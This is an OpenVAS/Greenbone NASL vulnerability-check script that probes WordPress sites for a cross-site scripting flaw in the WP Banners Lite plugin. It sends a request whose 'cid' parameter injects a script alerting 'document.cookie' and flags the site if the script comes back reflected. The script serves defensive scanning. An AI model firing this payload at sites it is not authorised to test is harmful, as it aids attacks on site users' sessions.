# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
arbitrary HTML or web script in a user's browser session in context of an
affected site.");
  script_tag(name:"affected", value:"WordPress WP Banners Lite Plugin version 1.40 and prior");
  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input to
the wpbanners_show.php script via cid parameter.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"WordPress WP Banners Lite Plugin is prone to an XSS vulnerability.");
  script_oid("1.3.6.1.4.1.25623.1.0.803450");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2013-03-26 15:56:32 +0530 (Tue, 26 Mar 2013)");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_name("WordPress WP Banners Lite Plugin Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120928");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Mar/209");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/wp-banners-lite-140-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

CPE = "cpe:/a:wordpress:wordpress";

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/wp-banners-lite/wpbanners_show.php?" +
            "id=1&cid=a_<script>alert(document.cookie);</script>";

if(http_vuln_check(port:port, url:url,
                   pattern:"<script>alert\(document\.cookie\);</script>", check_header:TRUE))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
